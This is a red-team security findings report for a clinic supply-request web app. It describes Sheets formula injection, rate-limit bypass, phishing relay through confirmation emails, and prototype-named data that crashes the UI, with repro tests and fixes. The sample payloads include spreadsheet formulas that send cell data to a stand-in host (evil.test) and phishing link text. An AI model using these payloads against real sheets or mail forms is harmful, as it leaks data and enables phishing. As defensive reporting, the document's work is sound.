# Security findings — external-view backend

Red-team pass on branch `Vish-F26`. All testing was local only (FastAPI TestClient /
`USE_SAMPLE_DATA`, email `send()` stubbed). No traffic was sent to production, Render,
Google Sheets, or any email provider.

Repro for every item: `tests/test_exploits.py`. Not-yet-fixed items are
`xfail(strict=True)` there, so the suite is green now and the test turns into a loud
failure (xpass) the moment the exploit stops working.

Run: `GMAIL_USER= GMAIL_APP_PASSWORD= RESEND_API_KEY= BREVO_API_KEY= DATABASE_URL= .venv/bin/python -m pytest -q`
→ see the status table; open items are the strict xfails in `tests/test_exploits.py`.

| ID | Severity | Component | Status | Owner |
|----|----------|-----------|--------|-------|
| EXP-01 | High | `main.py` Sheets writes | Fixed, verified (`value_input_option="RAW"` + `_sheet_safe` apostrophe, `_sheet_unsafe` on read) | email-engineer |
| EXP-05 | High | `POST /requests` confirmation email | Fixed, verified (`_no_links`, fixed subject) | email-engineer |
| EXP-02 | Medium | `main.py` `rate_limit_post` | Fixed, verified (XFF read only when `TRUST_PROXY=1`; set it on Render) | email-engineer |
| EXP-03 | Medium | `main.py` `/inventory/availability` | Fixed, verified | email-engineer |
| EXP-06 | Medium | `email.py` global daily cap | Fixed, verified (submit budget shares) | email-engineer |
| EXP-04 | Low | `main.py` `_make_request_id` | Fixed, verified (`secrets.token_hex(3)`) | email-engineer |
| EXP-07 | Low | `email.py` per-address cap | Fixed, verified (`_address_key`) | email-engineer |
| EXP-10 | Low | `POST /requests` quantity not checked against stock | Accepted risk (lead decision: HQ reviews every request) | n/a |
| EXP-11 | Medium | `GET /requests?email=` lookup | Fixed, verified (20/min per IP, own bucket, keyed on `_client_ip`) | email-engineer |
| EXP-12 | Low | `vercel.json` security headers | Fixed, verified (deploy check: CSP `connect-src` must equal Vercel's `REACT_APP_API_URL`) | main |
| EXP-08 | Low | `my-dashboard/src/hooks.js` `#/sent/<id>` | Fixed, verified (`REQUEST_ID_RE`, no decode) | frontend-engineer |
| EXP-09 | Low | `my-dashboard/src/hooks.js` `parseHash` | Fixed, verified (no decode; top-level `ErrorBoundary` added) | frontend-engineer |
| EXP-13 | Medium | `productIcons/mapping.js` + `App.js` inventory cache | Fixed, verified (root: `Map` + `hasIcon`; hardening: label fallback, cache after enrich, v2 cache, drop on failure, ErrorBoundary clears) | icon-designer (mapping) / frontend-engineer (App) |

---

## EXP-01 — Google Sheets formula / CSV injection (High)

**Component:** `main.py` — `submit_org_request` (`POST /requests`, sheet mode) and
`submit_request` (`POST /api/requests`); both call `ws.append_rows(..., value_input_option="USER_ENTERED")`.

**Repro:** `tests/test_exploits.py::test_sheet_values_are_not_live_formulas`. `POST /requests`
with `org_name='=HYPERLINK("https://evil.test?"&A1,"x")'` and an item whose `item_name` is
`=IMPORTXML("https://evil.test","//x")` and `category` is `@SUM(1)`. The captured write shows
the raw strings handed to `append_rows` with `value_input_option="USER_ENTERED"`:

```
['REQ-...','=HYPERLINK("https://evil.test?"&A1,"x")','attacker@x.org','=IMPORTXML("https://evil.test","//x")','@SUM(1)',1,'Under Review',...]
```

**Impact:** Any field an anonymous requester controls (`org_name`, `item_name`, `category`;
plus `nametag`/`request_notes` on `/api/requests`) is stored as a live formula because
`USER_ENTERED` makes Sheets evaluate it. When an HQ operator opens the Requests tab:
- `=IMPORTXML(...)` / `=IMPORTDATA(...)` fire outbound requests to an attacker URL (SSRF-from-the-sheet, data exfiltration).
- `=HYPERLINK("https://evil.test?"&A1, "click")` concatenates adjacent cell values (other orgs'
  emails/requests) into a link that leaks them when clicked.
- `=`/`+`/`-`/`@` payloads are the classic CSV-injection set and also execute on CSV export.

HTML escaping in `app/services/email.py` does **not** cover this — it is a separate sink (the sheet).

**Suggested fix:** Neutralize formula triggers before writing. Prefix any cell whose string value
starts with `= + - @` (also tab / CR) with a leading apostrophe `'`, or write with
`value_input_option="RAW"` for user-supplied columns. A small helper applied in the `batch`
construction of both endpoints is enough:

```python
def _sheet_safe(v):
    s = str(v)
    return "'" + s if s[:1] in ("=", "+", "-", "@", "\t", "\r") else s
```

---

## EXP-02 — Rate-limit bypass via X-Forwarded-For spoofing (Medium)

**Component:** `main.py` — `rate_limit_post` (`ip = fwd.split(",")[-1].strip()`).

**Repro:** `tests/test_exploits.py::test_rate_limit_not_bypassable_by_spoofing_xff` (xfail) vs.
the control `test_rate_limit_works_for_a_fixed_client` (passes). 15 `POST /requests` each with a
different `X-Forwarded-For: 10.0.0.<i>` all return 200 (limit never triggers); with a fixed XFF
the 11th–15th correctly return 429.

**Impact:** The limiter keys on the **last** XFF hop, which is attacker-controlled whenever the
request does not pass through exactly one trusted, XFF-appending proxy — i.e. any direct/local
reach, a misconfiguration, or 0/2+ proxies. Rotating the header gives each request its own bucket,
so the 10/min anonymous-write limit (and the `/requests` + email fan-out behind it) is defeated.
Taking the last hop is only safe under the specific assumption of one appending proxy; it is not a
safe default.

**Suggested fix:** Default to the real socket peer `request.client.host` and only trust
`X-Forwarded-For` when a known-proxy setup is explicitly configured (e.g. a `TRUSTED_PROXIES`
count/env, picking the Nth-from-right hop). At minimum, document that the limiter is only correct
behind exactly one appending proxy.

---

## EXP-03 — Availability falsely "Limited" for unknown quantity (Medium)

**Component:** `main.py` — `/inventory/availability`, `_qty()` + the remaining/branding logic.

**Repro:** `tests/test_exploits.py::test_unknown_quantity_is_not_branded_limited` (xfail). Sample
inventory with `Gauze` Quantity `"10"`, `MysteryBox` Quantity `""`, `RangeItem` Quantity `"10-20"`
→ availability `{'Gauze': 'Available', 'MysteryBox': 'Limited', 'RangeItem': 'Limited'}`.

**Impact:** `_qty()` returns `None` for any blank or non-integer Quantity. With no open requests,
`remaining = qty = None`, and `remaining is None or remaining <= 5` brands the item **"Limited"
(Low Stock)**. So every item with a missing/odd quantity string shows as low stock regardless of
real availability — this is the reported "783 of 1137 items show Limited" problem. It misleads
clinics and understates availability.

**Suggested fix:** Separate "unknown quantity" from "low stock". When `_qty()` is `None` and there
are no open requests, treat the item as `Available`/`Unknown` (or a distinct `"Unknown"` status/tag)
rather than `Limited`. Only brand `Limited` when a numeric remaining count is actually `<= 5`.

---

## EXP-04 — Predictable / collision-prone request IDs (Low, documented)

**Component:** `main.py` — `_make_request_id()` → `REQ-<epoch_seconds>-<000..999>` (sheet/sample mode).

**Impact:** Only 1000 random suffixes per second. IDs are guessable, and two requests in the same
second collide ~1/1000; because status is matched by Request ID, a colliding PATCH would flip status
(and send the status email) for an unrelated org's request. Low severity: request IDs are not used
for authorization (`PATCH` still requires the HQ token, EXP checks confirm), and DB mode generates
IDs server-side. No strict test (collision is probabilistic, not a clean assertion).

**Suggested fix:** Use `uuid4` (or a DB sequence) for the suffix instead of `randint(0,999)`.

---

## EXP-05 — POST /requests relays attacker text to any address (High)

**Component:** `app/services/email.py` `send_org_confirmation` / `send_hq_alert`, queued by
`_queue_submit_emails` in `main.py`.

**Repro:** `tests/test_exploits.py::test_confirmation_does_not_relay_attacker_text` (xfail).
`POST /requests` with `org_email=victim@example.com`,
`org_name="ACTION REQUIRED: your access expires today, verify at https://evil.test/login"` and
`item_name="Re-verify at www.evil.test/b4p"` → a "Blueprints HQ"-branded confirmation goes to the
victim containing `Hi ACTION REQUIRED: ... https://evil.test/login,` in both the HTML and the text
part (mail clients auto-link bare URLs, so HTML escaping does not help). The HQ alert subject becomes
`New supply request from ACTION REQUIRED: ... https://evil.test/login`.

**Impact:** Anyone can make our sending domain deliver attacker-written, link-bearing mail to any
address (the classic contact-form relay). The caps bound the volume (≈3/hour/address, 200/day
total), but each message is still phishing under our brand. Reports of it can get the
Resend/Brevo account suspended and hurt domain reputation. `item_name` is free text that is not
checked against inventory, so it carries the payload too. The display-name and Reply-To tricks are
**not** possible (see below).

**Suggested fix (cheapest first):** (1) The confirmation should not echo attacker text. Use "Hi
there," and list only item names that match an inventory row (reject or drop unknown names on
`POST /requests`). Keep `org_name` in the HQ alert *body* (escaped) but put the request ID in its
subject, not `org_name`. (2) Optionally strip/neutralize URLs in `org_name` at validation.

## EXP-06 — Anonymous traffic exhausts the global daily cap and blocks all mail (Medium)

**Component:** `app/services/email.py` `send()` → `_under_daily_limit()`.

**Repro:** `tests/test_exploits.py::test_anonymous_traffic_cannot_block_status_emails` (xfail,
with `EMAIL_DAILY_LIMIT=20`). Ten junk submissions (2 mails each) use up the budget. HQ then
approves a real clinic's request (`PATCH .../status` with the HQ token) and **no status email is
sent**. In a probe with the default 200: after 100 junk requests a new legitimate confirmation was
also dropped.

**Impact:** Every submission spends 2 units of the shared 200/day budget, so 100 anonymous requests
silence all mail for 24h: confirmations, HQ alerts, and HQ-triggered Approved/Shipped notices.
At 10/min per IP that takes one IP about 10 minutes. The cap reset on restart does not help, since
an attacker can simply repeat the flood.

**Suggested fix:** Spend the cap only on anonymous-triggered mail. Give confirmations their own
budget, and exempt status emails (HQ-authenticated) from it, or give them a separate, higher budget.
HQ alerts can share the confirmation budget or be batched. Optionally log a warning once when the
confirmation budget runs out, so HQ notices the flood.

## EXP-07 — Per-address cap bypass via address aliases (Low)

**Component:** `app/services/email.py` `_confirmation_allowed()` (key = `address.strip().lower()`).

**Repro:** `tests/test_exploits.py::test_confirmation_cap_covers_address_aliases` (xfail). Sends to
`victim@gmail.com`, `victim+1@…`, `victim+2@…`, `v.ictim@…`, `vi.ctim@…`, `victim@gmail.com.` and
`victim@googlemail.com` produced 7 confirmations (cap 3), and all of them land in one inbox.

**Impact:** One victim can receive up to the global budget instead of 3/hour. Low on its own,
because EXP-06's cap bounds it, but it is the main way to aim EXP-05 at a single person.

**Suggested fix:** Normalize the key: lowercase, strip a trailing `.` from the domain, drop `+tag`
from the local part, and for `gmail.com`/`googlemail.com` remove dots and use a single domain.
Alternatively, cap per domain as well.

## EXP-10 — Requested quantity is not checked against stock (Low, accepted risk)

The client caps quantity at stock (`useCart.js` `capQuantity`), but `POST /requests` accepts 1–10000
per line regardless of stock. A direct POST can over-request, which brands the item "Requested" for
other clinics until HQ acts. **Accepted risk:** HQ reviews every request before anything ships
(lead decision, 2026-10-09). If availability manipulation becomes a problem, revisit it.

## EXP-11 — Request lookup by email is not rate-limited (Medium)

**Repro:** `tests/test_exploits.py::test_request_lookup_is_rate_limited` (xfail). 30 `GET /requests?email=`
lookups for different addresses from one client all return 200; only `POST /requests` is limited.

**Impact:** The lookup is the app's only access check: knowing a clinic's email is enough to read
that clinic's request history (item names, quantities, dates, status). Clinic contact addresses are
often public, and with no throttle an attacker can test unlimited candidates (`info@`, `admin@`, … per
clinic domain) and harvest every hit.

**Suggested fix (cheapest):** Put `Depends(rate_limit_post)` (or a separate, looser bucket of about 30/min)
on `GET /requests` when `email` is given. Long-term, send the clinic an unguessable lookup link by
email instead of filtering on the bare address.

## EXP-12 — No framing protection or CSP on the Vercel deploy (Low)

**Repro:** `tests/test_exploits.py::test_vercel_sets_frame_and_csp_headers` (xfail). `vercel.json` has no
`headers` block, so the deployed app sends no `X-Frame-Options`/`frame-ancestors` and no CSP.

**Impact:** Any site can frame the app and trick a clinic user into clicks (the org name and email are
remembered, and the hash route can open a specific item). Impact is limited, because every request goes
to HQ review. Without a CSP there is no second layer if an XSS ever appears.

**Suggested fix:** Add to `vercel.json`:
`"headers": [{"source": "/(.*)", "headers": [{"key": "Content-Security-Policy", "value": "default-src 'self';
img-src 'self' data: https://drive.google.com https://*.googleusercontent.com; connect-src 'self' <API origin>;
frame-ancestors 'none'; base-uri 'self'; form-action 'self'"}, {"key": "X-Frame-Options", "value": "DENY"},
{"key": "Referrer-Policy", "value": "no-referrer"}, {"key": "X-Content-Type-Options", "value": "nosniff"}]}]`.
Drive thumbnails redirect to `*.googleusercontent.com`, so that host must be allowed. Check that the CRA
build has no inline scripts (`INLINE_RUNTIME_CHUNK=false`) before shipping `script-src 'self'`.

**EXP-12 CSP compatibility (verified 2026-10-09):** everything the UI loads is allowed: the Google Fonts
stylesheet (`style-src`), font files (`font-src fonts.gstatic.com`), Drive thumbnails and their
`*.googleusercontent.com` redirect (`img-src`), the inline `data:` SVG in `styles.css` (`img-src data:`), and the
same-origin favicon/manifest/bundle. The production build has 1 external script, 0 inline scripts/styles, and 0
`.map` files. React `style={{…}}` props and the copy-fallback's `el.style` use the CSSOM, which `style-src` does not
block. `'unsafe-inline'` in `style-src` is therefore likely removable; verify in a browser before dropping it. **Lead decision:** keep `'unsafe-inline'` for now (low risk, not yet browser-tested).
Regression test: `test_csp_allows_everything_the_frontend_loads`.

**EXP-12 deploy check:** `connect-src` hardcodes `https://b4p-external-view-w26-backend.onrender.com`,
which appears nowhere else in the repo. If Vercel's `REACT_APP_API_URL` points anywhere else, the browser
blocks every API call and the production app shows only errors. Compare the two values in the Vercel
dashboard before deploying. I did not check this against production (out of scope). **Resolved:** the lead confirmed the live Vercel bundle uses exactly this URL.

## EXP-08 — Content spoofing via `#/sent/<text>` (Low)

**Repro:** `tests/test_exploits.py::test_sent_route_only_accepts_request_ids` (xfail; runs the real
`parseHash` from `hooks.js` in node). A crafted link `#/sent/<url-encoded sentence>` renders that
sentence as the "Request ID" under a "Request sent" heading on our domain.

**Impact:** Lets a crafted link show a fake message on our real site. It's text only (React
escapes it), so there's no XSS.

**Fix:** In `parseHash`, return the `sent` route only when the id matches the request-ID format
(e.g. `/^REQ-\d+-[0-9a-z]+$/i`); otherwise fall back to the catalog.

## EXP-09 — Malformed hash blanks the whole app (Low)

**Repro:** `tests/test_exploits.py::test_malformed_hash_does_not_crash_app` (xfail). `#/sent/%` makes
`decodeURIComponent` throw `URIError` inside `useHashRoute`'s `useState` initializer. `index.js`
has no error boundary, so React unmounts the app and leaves a blank page until the URL is
edited by hand.

**Fix:** Wrap the decode in try/catch (treat failure as the catalog route), and add a top-level
error boundary.

## EXP-13 — A "constructor"/"__proto__" subcategory permanently crashes the UI (Medium)

**Component:** `my-dashboard/src/productIcons/mapping.js` `matchItem()` (`SUBCATEGORIES[sub]` on a plain object),
plus `App.js` `useInventory()` (the cache is written before `enrich()`, and the cache is enriched inside a `useState` initializer).

**Repro:** `tests/test_exploits.py::test_prototype_named_subcategory_does_not_crash_ui` (xfail; runs the real
modules in Jest). Take an inventory row whose name matches no icon rule and whose Subcategory is `constructor` or `__proto__`,
in any case. `matchItem` hits the inherited `Object.prototype` property and returns `{via: 'subcategory'}` with no `label`, so
`enrich()` calls `undefined.toLowerCase()`. Mounting `<App/>` with that row in `b4p.inventory.v1` throws
`TypeError: Cannot read properties of undefined (reading 'toLowerCase')`.

**Impact:** One inventory cell takes the catalog down for everyone. The cell can come from an HQ edit to the sheet or DB, a
typo, or a tampered localStorage. On the first load, `writeInventoryCache(rows)` runs before `enrich(rows)`, so the bad rows get
cached, and then the UI shows an error state containing the raw TypeError text. On every later visit, `enrich(cached.supplies)`
throws during the first render. The ErrorBoundary shows, the refresh fetch never runs, and "Reload" re-reads the same cache. So
even after HQ fixes the cell, returning users stay locked out until they clear site data. Anonymous API users cannot trigger it,
because they cannot write inventory.

**Suggested fix:** (1) In `mapping.js`, use `Object.hasOwn(SUBCATEGORIES, sub)`, or build it with `Object.create(null)` or a `Map`.
Apply the same to `iconForSubcategory`. (2) In `App.js`, make it defensive: `const type = typeLabelFor(item) || 'Unsorted supplies'`,
write the cache only after `enrich()` succeeds, and wrap the cached `enrich` in try/catch so that on failure the app drops the
`b4p.inventory.v1` key and loads fresh. Optionally, the ErrorBoundary "Reload" can also clear that key.

**EXP-13 status:** fixed and hardened. Root fix (icon-designer): `SUBCATEGORIES` is a `Map`, and `hasIcon()` uses an own-property
check, so `constructor`/`__proto__`/`toString` resolve to the box fallback. Hardening (frontend-engineer): `enrich()` falls back to a
default label; the cache is written only after `enrich()` succeeds; the cache is versioned (`v: 2`) and shape-checked; a failing cached
enrich drops the cache and loads fresh; the ErrorBoundary clears the cache. Verified against the current `App.js` (`const fresh = enrich(rows)` runs before `writeInventoryCache`; the cached
enrich is wrapped in try/catch and calls `clearInventoryCache()`). An earlier note here, saying the hardening had not been applied,
came from reading the file before that change was on disk; it is withdrawn. The regression test
(`test_prototype_named_subcategory_does_not_crash_ui`, running real modules in Jest) checks four things: (1) the label is always a
string for `constructor`/`__proto__`/`Constructor`; (2) a poisoned v2 cache loads without the error page; (3) poisoned cache →
`enrich()` throws → cache cleared → the fresh fetch renders and is re-cached (with a module mock that throws only for the poisoned
row); (4) unusable *fresh* data is never written to the cache.

## Products / FEFO regression (2026-10-09)

The cart is keyed by `name|maker` product keys (≤400 chars, validated in `cleanLines`). Keys always contain `|`, so they can never be
`__proto__`/`constructor`, and the one plain-object map keyed by product (`TypeTable` `open`) is safe. Submit builds every POST line
from loaded inventory (`requestName` and the lot's own `sheet_row`); unknown cart ids are dropped, and more than 100 lots are blocked
client-side. Property fuzz of the real `groupProducts`/`allocateFefo` (2000 random products) showed: the allocated total always
equals the requested amount, the rows come only from the product's own lots, no expired lot is used, there is one line per row, and
each quantity is 1–10000. Mounting the real `<App/>` with tampered carts (bad JSON, nulls, `__proto__`, 401-character ids, object
names, a 1e9 quantity, negative max, legacy numeric ids, markup names) on `#/`, `#/slip` and `#/checkout` never crashes. Over-stock
requests remain the accepted EXP-10 risk, because overflow goes to one lot.


**Partial-submit fix (verified):** `handleSubmit` now blocks with an inline error if any cart line is missing from `productsById`,
so nothing partial is POSTed and the confirmation always matches what was sent. The maker merge (`makerKey`) is pure string
normalization, with no object-key lookups.
## Checked and NOT exploitable

- **Recipient injection via `org_email`.** The regex rejects `a@x.org,b@y.org`, `;` lists, display
  names (`Evil <a@x.org>`), CRLF/`Bcc:` and space-separated lists
  (`test_org_email_cannot_add_recipients`). `a@x.org,y.org` is accepted but contains a single `@`,
  so it cannot add a second recipient.
- **Reply-To / From spoofing.** Both come only from env (`EMAIL_FROM`, `EMAIL_REPLY_TO`/`HQ_EMAIL`).
  No request field reaches a header other than the subject, and the subject is collapsed to one line.
- **Cap races.** 40 threads calling `send_org_confirmation` for one address at once (20 trials)
  never exceeded 3; the GIL is enabled on this Python 3.14 build. If the deploy ever moves to a
  free-threaded build, re-check this, because the check-then-append is not locked.
- **XFF bypass, combined with the relay.** Fixed (EXP-02). Without `TRUST_PROXY=1`, spoofed XFF is
  ignored. With it set, the last hop is used, which is correct only if Render's proxy appends the
  client IP as the last hop. I could not verify that without production traffic (out of scope), so
  check it once in the Render logs. If `TRUST_PROXY` is *not* set on Render, every client shares
  the proxy's IP. That leaves one global 10/min bucket, so one attacker could block all submissions.
- **Sheets error text leaking to clients.** Fixed by email-engineer and verified through qa-tester's
  `tests/test_api_contract.py` `*_without_leak` tests: a Google 429 returns 503, other API errors return 502, and
  Google's text is never echoed.


- **HQ auth (`require_hq`)** — `hmac.compare_digest` (constant-time), empty/unset token → 403,
  wrong/short token → 401, header value coerced safely. Covered by `tests/test_security.py`.
- **Org filter IDOR (`GET /requests?email=`)** — exact case-insensitive match; substring (`email[1:]`),
  `%`, and empty/whitespace email do not leak other orgs (empty → HQ-token required). This is
  intentional no-auth-by-design; cheapest mitigation if desired: email an unguessable view link / OTP
  rather than filtering on the raw address. Covered by `test_security.py`.
- **Email injection** — subjects collapsed to one line (no CRLF), all user text HTML-escaped incl.
  `org_name`, `item_name`, `status`, review flags. Covered by `test_security.py`.
- **DB error leakage** — `_db_error` maps RaiseException/Check/DataError→400, Integrity→409,
  else→503, never echoing raw text. Covered by `test_security.py`.
- **Payload limits** — items 1–100, quantity 1–10000, name/email length + email regex enforced (422).
- **SQL injection (`app/db.py`)** — all queries parameterized (`%s` + psycopg); JSON via `Jsonb`. No
  string interpolation of user input into SQL. Not exploitable.
- **Frontend XSS:** no `dangerouslySetInnerHTML`/`innerHTML`/`eval`; images only from validated
  Drive IDs with `referrerPolicy="no-referrer"`; localStorage cart is shape-checked; checkout
  has an in-flight guard (no double-submit). `npm run build` (CI=true) compiles cleanly.
- **Frontend, deep pass (redesign):** all inventory and request fields render as React text; quantities
  are capped via `capQuantity` (and the input strips non-digits); the request lookup only sends a regex-valid
  address through `encodeURIComponent`; there are no `REACT_APP_*` secrets in the bundle. Informational: the
  CRA build ships a `.map` source map, and the dev server binds to all interfaces (LAN-visible during
  `npm start`). Neither matters if the repo is public, but set `GENERATE_SOURCEMAP=false` /
  `HOST=127.0.0.1` if it isn't.
- **CORS** — `ALLOWED_ORIGINS` is an explicit allowlist (default localhost), not `*`-with-credentials.

## Final regression pass (2026-10-09, after the frontend polish round)

Verdict: **safe to push.** `pytest -q` gives 245 passed, 0 xfailed. The `CI=true` build (deploy flags) compiles. The built
`index.html` has 0 inline scripts or styles, and there are no `.map` files. The built JS references only drive.google.com,
plus reactjs.org as error-message text. `src/` contains no HTML sinks (`dangerouslySetInnerHTML`, `innerHTML`, `eval`,
`javascript:`, `window.open`, `_blank`). No new origins: `evil.com` appears only in `inventory.test.js` negative cases, and the
vercel.app `og:image` is preview metadata, not something the page loads. localStorage: the cart is shape-checked, deduped and
capped (`cleanLines`), the org fields are type-checked, and the layout is allow-listed. Stored values only reach the DOM as text,
or through `thumbnailUrl`'s Drive-ID check. Hash-route fuzzing (`%`, encoded markup, `javascript:`, huge, negative and exponent
item ids, path tricks, 100k-character hash) never throws, and every result is the catalog, a valid REQ id, or a "not found" item.

## CSP guard after the McMaster-style redesign (2026-10-09)

The lead tightened the CSP to `img-src 'self' data:`, `font-src 'self'` and `style-src 'self' 'unsafe-inline'`, removing Drive photos and Google
Fonts. `test_csp_allows_everything_the_frontend_loads` now **derives** origins from the code instead of hard-coding them: it scans
`public/index.html` (skipping `<meta>`/og tags and comments) and non-test `src/*.js|*.css` (skipping comments and the `127.0.0.1` dev
fallback), and checks each origin against its directive (script, stylesheet, image/icon, `@font-face`, `@import`; JS URLs must be allowed by
`img-src` or `connect-src`). `test_removed_origins_stay_removed` bans Drive, googleusercontent and Google Fonts from the code and the CSP.
It was a strict xfail because the dead `driveFileId`/`thumbnailUrl` helpers (plus the `imageId` plumbing in `normalizeItem`/`useCart`)
remained in `src/inventory.js`. **Fixed, verified:** frontend-engineer deleted them, and the test now passes.

## Round 3 regression (perf, branding, footer) — 2026-10-09

Clean. pytest 298 passed; the `CI=true` deploy build compiles; no new sinks (only the static icon sprite); no new origins in the built
JS/CSS; storage keys unchanged (`b4p.cart.v1`, `b4p.inventory.v1`, `b4p.org.v1`).
- Footer `mailto:` uses a build-time `REACT_APP_CONTACT_EMAIL`, regex-checked with a fixed fallback. The `mailto:` prefix is
  hard-coded, so the value cannot become a `javascript:` URL. Only the deployer controls it.
- `progressive.js` chunking cancels its idle callbacks on cleanup. This is performance only, with no data-driven code.
- `groupProducts` now drops expired lots before grouping, so every product has at least one lot and `allocateFefo`'s
  `product.lots[0]` fallback can't be undefined. `allocateFefo` re-sorts by FEFO rank itself, so the new A–Z lot display order does
  not affect allocation. A 2000-product fuzz (now also asserting expiry order) and tampered carts with the v2 cache on the real
  `<App/>` both pass.
- Self-hosted Manrope under `/fonts` is covered by `font-src 'self'`, and the derived CSP test treats relative URLs as same-origin.
- **Round 3 final (self-hosted font):** `public/fonts/manrope-latin-var.woff2` is a genuine WOFF2 (`wOF2` magic, 24 KB) with
  `OFL.txt`, and the build serves it same-origin from `/fonts` (`font-src 'self'`). `index.html` now has an inline `<style>`
  @font-face, which works only because `style-src` keeps `'unsafe-inline'`. The derived CSP test now fails if that allowance
  (or a hash) is removed while inline styles exist, or if an inline `<script>` is added, and it checks absolute `url()`s inside
  inline styles. Both negative cases were self-tested. `matchingTypes` uses plain `startsWith` word matching, and no `RegExp`
  is built from user input anywhere in `src`.

## Round 4 regression (landing collapse, header, sizing) — 2026-10-09

Clean. pytest 298 passed; the `CI=true` build compiles; no new sinks (only the static sprite), no new origins, no `RegExp` built from input.
New `sessionStorage` key `b4p.landing.open.v1` is parsed in try/catch, filtered to strings and used only for `Set.has`. I mounted the
real `<App/>` on `#/` with bad JSON, non-arrays, `{"__proto__":1}`, mixed or prototype-named entries, markup strings and a
50,000-entry array: no crash, no injected markup. The new `title` attributes are React-escaped text.
- **Font revert (2026-10-09):** self-hosted Manrope, its preload and the inline `<style>` @font-face were removed. Verified:
  `public/fonts/` is gone, and the built `index.html` has 1 external script, 0 inline `<style>`, 0 `style=` attributes and no font
  requests. The CSP guard is conditional and needed no change: it requires `'unsafe-inline'` only while inline styles exist,
  and it still fails on any inline `<script>`. `'unsafe-inline'` in `style-src` is no longer needed for `index.html`; React
  `style={}` props use the CSSOM, which `style-src` does not block. It could be dropped after a browser check.

## External red-team findings N1-N12 (session vishnavramesh-3a) — reproduced 2026-10-10

Reproduced on the current Vish-F26 code, sample mode, email `_send` stubbed (no mail leaves). Each has a strict-xfail
regression in `tests/test_exploits.py`; the lead's decision is recorded as the intended fix. N4-N7, N10, N11 were not in the
handed-off batch. Full suite: 310 passed, 9 xfailed.

| ID | Sev | Component | Status | Test |
|----|-----|-----------|--------|------|
| N1 | High | `email.py` daily budget vs HQ alerts | Open | `test_hq_alerts_survive_email_budget_exhaustion` |
| N2 | High | `email.py` confirmation + status templates | Open | `test_confirmation_and_status_emails_have_no_free_text` |
| N3 | Medium | `main.py` `_check_rate` / `_client_ip` | Open | `test_rate_limit_buckets_ipv6_by_64`, `test_rate_limit_table_is_bounded` |
| N8 | Medium | `main.py` `/inventory/availability` | Open | `test_under_review_request_does_not_change_availability` |
| N9 | Medium | `main.py` availability name/qty math | Open | `test_availability_duplicate_name_rows_are_per_row`, `_negative_quantity_is_clamped`, `_matches_normalized_name` |
| N12 | Low | `main.py` `StatusUpdateBody` | Open | `test_status_update_allows_db_statuses` |

**N1 — anonymous flood blinds HQ (High).** HQ new-request alerts share the global `EMAIL_DAILY_LIMIT` with anonymous
confirmations (both go through `send()` -> `_under_daily_limit()`, and alerts also spend `_under_submit_budget(ALERT_SHARE)`).
With `EMAIL_DAILY_LIMIT=6`, 4 anonymous submissions exhaust the budget and the next genuine request produces no HQ alert. At
the default 200, ~85-110 submissions (one IP for ~9 min, or rotating IPs) silence all mail for 24h, including HQ alerts.
**Decision:** HQ alerts (one fixed address, can't be used to spam others) are never blocked by the global budget; batch them —
after 30 alerts/hour, send one hourly digest "N more requests" instead. Confirmations also get a per-IP cap (5/hour).

**N2 — phishing via confirmation and status emails (High).** `category` is not run through `_no_links`, so
`category="see evil.test"` reaches the confirmation sent to the attacker-chosen address. `send_status_update` applies no
`_no_links` at all, so `org_name` text/links reach the status email. Confirmed: both bodies contained `evil.test`.
**Decision:** confirmation and status emails become fixed templates with NO free text — request ID, number of lines, status,
and "see My requests on the dashboard". No org name, item names or category.

**N3 — rate-limit bypass and unbounded table (Medium).** `_client_ip` keys on the full address, so 15 addresses in one IPv6
/64 (one customer allocation) each get their own 10/min bucket (0 of 15 limited). `_check_rate` cleanup only drops idle keys,
so 50,000 distinct spoofed keys within 60s leave `_hits` at 50,000 entries. Last-hop XFF under `TRUST_PROXY` is correct only if
Render appends the real client IP as the last hop (confirmed by the lead that the live bundle relies on that); keep it only
behind Render. **Decision:** bucket IPv6 by /64, LRU-cap `_hits` at 10k, keep last-hop trust only behind Render.

**N8 — one request flips availability for everyone (Medium).** Availability subtracts Under Review + Approved open quantity, so
one anonymous 10000-unit request (max per line) marks the item Requested/0 for every clinic, before any HQ review.
**Decision:** only HQ-Approved requests hold stock; Under Review requests don't change availability. Update the README
(availability wording).

**N9 — availability math (Medium).** (a) Open quantity is pooled across all rows sharing a name and subtracted from each row, so
after a 1-unit approval on a (1 + 100) duplicate-name pair, the 1-unit lot reads `remaining` 100 (grew). (b) A raw Quantity of
`-5` shows `remaining: -5`. (c) Name matching is `strip().lower()` only, so a request whose item name differs by inner
whitespace / NBSP / case does not match its inventory row. **Decision:** per-row subtraction, clamp at 0, and Unicode NFKC +
whitespace/punctuation normalization for name matching.

**N12 — status model narrower than the DB (Low).** `StatusUpdateBody` is `Literal["Approved", "Shipped"]`, but the DB supports
Delivered/Denied/Cancelled; a PATCH with those returns 422, so HQ can't record them via the API. **Decision:** allow
Delivered/Denied/Cancelled with the DB's transition rules.

## Vercel serverless migration — security pass (2026-10-10)

Reviewed commit c6b9966 (api/index.py mounts main.app under /api; vercel.json functions + rewrite; .vercelignore; inline email
on VERCEL; preview -> sample mode; production 503 guard; proxy trust on VERCEL). Local only; Google blocked, no DB, email stubbed.
N1-N12 fixes (cfea031/53a26fa) are in and their 9 regressions pass. Verified working: the production 503 guard fires for every
route and is not bypassed by USE_SAMPLE_DATA or VERCEL_ENV casing/whitespace; preview with no secrets serves sample data with email
off; inline email returns within the 5s budget (well under maxDuration 15s) even when the provider hangs.

| ID | Sev | Finding | Status |
|----|-----|---------|--------|
| V1 | Low-Med | OpenAPI docs/schema served in production | Fixed, verified (off on Vercel/Render unless ENABLE_API_DOCS=1) |
| V2 | Low | .vercelignore misses common secret filenames | Fixed, verified (globs: .env*, *.pem, *.key, *credential*, *gcreds*, ...) |
| V-PREVIEW | Medium | preview isolation depends on env vars being production-scoped | Fixed, verified: previews are sandboxed in code even with secrets (only PREVIEW_ALLOW_REAL_DATA=true opts out) |
| V4 | Medium | internal POST /api/requests (/api/api/requests) anonymous + unthrottled sheet writer | Fixed, verified (HQ token + rate limit) |
| V-STATE | Medium | in-memory rate limits / email caps are per-instance on serverless | Mitigated by required Vercel firewall rule (DEPLOY_VERCEL.md); app limits are best-effort |
| V3 | Info | X-Forwarded-For trust behind Vercel's proxy | Fixed: reads x-vercel-forwarded-for, only when VERCEL is set (tested) |

**V1 — docs exposed in production.** `/api/docs`, `/api/openapi.json`, `/api/redoc` all return 200 in every mode (the docs
routes bypass the `_check_configured` 503 guard). The schema lists every route and names the `X-HQ-Token` auth header, which helps
an attacker. Fix: create `main.app` with `docs_url=None, redoc_url=None, openapi_url=None` in production (keep them in
